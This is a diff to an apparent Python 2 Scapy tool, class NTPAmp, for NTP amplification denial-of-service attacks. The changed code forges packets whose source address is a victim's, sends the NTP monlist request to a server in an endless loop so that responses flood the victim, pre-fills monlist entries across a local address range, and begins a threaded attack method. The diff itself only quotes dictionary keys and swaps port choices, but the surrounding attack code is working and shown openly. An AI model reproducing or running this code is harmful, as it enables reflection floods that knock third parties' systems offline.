@@ -18,31 +18,30 @@ class NTPAmp(object):
         Send ntp sync
         this is equals ntpdate
         """
-        #leap='unknown (clock unsynchronized)',version=4L,stratum=0L,poll=3L,precision=250L,delay=1.0,dispersion=1.0,ref_id='',orig=0.0,sent=now
         ntpconf = {
-            leap: 'unknown (clock unsynchronized)',
-            version: 4L,
-            stratum: 0L,
-            poll: 3L,
-            precision: 250L,
-            delay: 1.0,
-            dispersion: 1.0,
-            ref_id: '',
-            orig: 0.0,
-            sent: datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")
+            'leap': 'unknown (clock unsynchronized)',
+            'version': 4L,
+            'stratum': 0L,
+            'poll': 3L,
+            'precision': 250L,
+            'delay': 1.0,
+            'dispersion': 1.0,
+            'ref_id': '',
+            'orig': 0.0,
+            'sent': datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")
         }
         pkt=IP(src=srcip, dst=self.ntpserv)/UDP(sport=sport,dport=123)/NTP(**ntpconf)
         send(pkt)
 
     def get_monlist(self):
         data = "\x17\x00\x03\x2a" + "\x00" * 4
-        pkt=IP(dst=self.ntpserv,src=self.victim)/UDP(sport=random.randint(2000, 65535),dport=123)/Raw(load=data)
+        pkt=IP(dst=self.ntpserv,src=self.victim)/UDP(sport=self.DEFAULT_PORT,dport=123)/Raw(load=data)
         send(pkt,loop=1)
 
     def warmup(self):
         target="192.168.178.{}"
         for r in range(1, 254):
-            self.add_monlist(target.format(r), self.DEFAULT_PORT)
+            self.add_monlist(target.format(r), random.randint(2000, 65535))
 
     def attack(self):
         threads=[]
